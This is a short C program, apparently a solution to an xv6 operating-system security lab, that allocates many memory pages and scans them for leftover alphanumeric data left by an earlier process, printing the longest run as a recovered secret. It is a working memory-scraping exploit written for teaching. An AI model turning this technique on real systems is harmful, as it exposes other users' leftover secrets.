// user/attack.c
// Aggressive scanner: allocate many pages and report the longest alphanumeric run found.

#include "kernel/types.h"
#include "user/user.h"

#define PGSZ 4096
#define MAX_PAGES 3000      // increase if you need to scan more pages
#define MAX_SECRET 1024     // cap on secret length we will store

static int
isalnum_char(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

int
main(int argc, char *argv[])
{
  // Buffer to keep best candidate
  char best[MAX_SECRET + 1];
  int bestlen = 0;
  for (int i = 0; i <= MAX_SECRET; i++) best[i] = 0;

  // Try many small allocations (one page each). sbrk returns pointer to newly
  // allocated page (address of that page). On this lab, new pages may contain
  // former data (secret).
  for (int p = 0; p < MAX_PAGES; p++) {
    char *page = sbrk(PGSZ);
    if (page == (char*)-1) break;

    // scan entire page
    int i = 0;
    while (i < PGSZ) {
      // skip non-alnum
      while (i < PGSZ && !isalnum_char(page[i])) i++;
      if (i >= PGSZ) break;
      int j = i;
      while (j < PGSZ && isalnum_char(page[j]) && (j - i) < MAX_SECRET) j++;
      int len = j - i;
      if (len > bestlen) {
        // copy into best
        if (len > MAX_SECRET) len = MAX_SECRET;
        for (int k = 0; k < len; k++) best[k] = page[i + k];
        best[len] = '\0';
        bestlen = len;
      }
      i = j;
    }

    // Heuristic: if we already found a reasonably long string, continue a
    // little more and then stop to save time. You can raise or remove threshold.
    if (bestlen >= 8) break;
  }

  if (bestlen > 0) {
    printf("%s\n", best);
    exit(0);
  }

  // nothing found
  exit(1);
}
